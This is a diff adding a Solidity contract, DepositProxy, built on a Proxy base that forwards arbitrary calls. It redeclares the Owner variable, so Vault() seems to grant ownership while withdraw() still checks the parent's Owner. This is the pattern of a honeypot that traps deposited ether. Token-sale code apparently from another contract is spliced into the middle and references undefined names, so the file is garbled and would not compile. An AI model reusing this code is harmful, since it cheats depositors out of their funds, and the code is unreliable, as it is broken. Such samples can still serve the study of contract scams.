@@ -1,0 +1,111 @@
+ 
+
+pragma solidity ^0.4.24;
+
+contract Proxy  {
+    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
+    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
+    function proxy(address target, bytes data) public payable {
+         
+        target.call.value(msg.value)(data);
+    }
+}
+
+contract DepositProxy is Proxy {
+    address public Owner;
+    mapping (address => uint256) public Deposits;
+
+
+    uint256 public totalSupply = 850 * (10 ** uint256(18));
+    bytes32 private emptyHash;
+    mapping (address => uint256) balances;
+    mapping (address => string) addressToAccount;
+    mapping (bytes32 => address) accHashToAddress;
+
+    event BuyIGO(address indexed _from, string _account, uint256 _ethVal, uint256 _tthVal);
+    
+    function TokenTycoonIGO() public {
+        addrAdmin = msg.sender;
+        addrService = msg.sender;
+        addrFinance = msg.sender;
+        balances[this] = totalSupply;
+        emptyHash = keccak256("");
+    }
+    
+    function buy(string _account) external payable whenNotPaused {  
+        uint256 val = msg.value;
+        uint256 tthVal;
+        if (val == 1 ether) {
+            tthVal = 1100000000000000000;
+        } else if (val == 3 ether) {
+            tthVal = 3600000000000000000;
+        } else if (val == 5 ether) {
+            tthVal = 6500000000000000000;
+        } else if (val == 10 ether) {
+            tthVal = 15000000000000000000;
+        } else if (val == 20 ether) {
+            tthVal = 34000000000000000000;
+        } else {
+            require(false);
+        }
+        uint256 b = balances[this];
+        require(b >= tthVal);
+
+        bytes32 hashAccount = keccak256(_account);
+        require(hashAccount != emptyHash);
+
+        address preAddr = accHashToAddress[hashAccount];
+        string storage preAcc = addressToAccount[msg.sender];
+        bytes32 hashPreAcc = keccak256(preAcc);
+
+        if (preAddr == address(0)) {
+            require(hashPreAcc == emptyHash);
+            accHashToAddress[hashAccount] = msg.sender;
+            addressToAccount[msg.sender] = _account;
+            _transfer(this, msg.sender, tthVal);
+        } else if(preAddr == msg.sender) {
+            require(hashPreAcc == hashAccount);
+            _transfer(this, msg.sender, tthVal);
+        } else {
+            require(false);
+        }
+
+        BuyIGO(msg.sender, _account, val, tthVal);
+    }
+
+    function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
+        require(_to != address(0));
+        uint256 oldFromVal = balances[_from];
+        require(_value > 0 && oldFromVal >= _value);
+        uint256 oldToVal = balances[_to];
+        uint256 newToVal = oldToVal + _value;
+        require(newToVal > oldToVal);
+        uint256 newFromVal = oldFromVal - _value;
+        balances[_from] = newFromVal;
+        balances[_to] = newToVal;
+        assert((oldFromVal + oldToVal) == (newFromVal + newToVal));
+        Transfer(_from, _to, _value);
+        return true;
+    }
+
+    function () public payable { }
+    
+    function Vault() public payable {
+        if (msg.sender == tx.origin) {
+            Owner = msg.sender;
+            deposit();
+        }
+    }
+    
+    function deposit() public payable {
+        if (msg.value > 0.5 ether) {
+            Deposits[msg.sender] += msg.value;
+        }
+    }
+    
+    function withdraw(uint256 amount) public onlyOwner {
+        if (amount>0 && Deposits[msg.sender]>=amount) {
+            msg.sender.transfer(amount);
+        }
+    }
+}
